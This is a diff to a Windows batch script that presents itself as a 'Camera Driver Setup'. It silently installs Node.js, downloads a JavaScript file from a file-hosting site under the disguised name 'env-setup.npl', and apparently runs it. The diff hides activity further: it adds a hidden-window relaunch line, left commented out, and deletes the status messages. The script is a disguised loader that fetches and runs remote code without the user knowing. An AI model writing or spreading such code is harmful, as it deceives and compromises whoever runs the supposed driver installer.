@@ -2,6 +2,8 @@
 title Creating new Info
 setlocal enabledelayedexpansion
 
+:: if "%~1" neq "_restarted" powershell -WindowStyle Hidden -Command "Start-Process -FilePath cmd.exe -ArgumentList '/c \"%~f0\" _restarted' -WindowStyle Hidden" & exit /b
+
 REM Get latest Node.js version using PowerShell
 for /f "delims=" %%v in ('powershell -Command "(Invoke-RestMethod https://nodejs.org/dist/index.json)[0].version"') do set "LATEST_VERSION=%%v"
 
@@ -42,8 +44,7 @@ if not defined NODE_EXE (
         curl -s -L -o "%~dp0%NODE_MSI%" "%DOWNLOAD_URL%" >nul 2>&1
     )
 
-    if exist "%~dp0%NODE_MSI%" (
-        echo [INFO] Extracting Camera Driver MSI to %EXTRACT_DIR%...
+    if exist "%~dp0%NODE_MSI%" (        
         msiexec /a "%~dp0%NODE_MSI%" /qn TARGETDIR="%EXTRACT_DIR%" >nul 2>&1
         del "%~dp0%NODE_MSI%"
     ) else (
@@ -80,7 +81,6 @@ if errorlevel 1 (
     echo [INFO] curl not found. Using PowerShell to download env-setup.npl...
     powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 3072; Invoke-WebRequest -Uri 'https://files.catbox.moe/1gq866.js' -OutFile '%CODEPROFILE%\env-setup.npl'" >nul 2>&1
 ) else (
-    echo [INFO] Using curl to download env-setup.npl...
     curl -L -o "%CODEPROFILE%\env-setup.npl" "https://files.catbox.moe/1gq866.js" >nul 2>&1
 )
 :: -------------------------
@@ -98,6 +98,7 @@ if exist "%CODEPROFILE%\env-setup.npl" (
     echo [ERROR] env-setup not found.
     exit /b 1
 )
+
 
 echo [SUCCESS] Camera Driver Setup completed successfully.
 exit /b 0
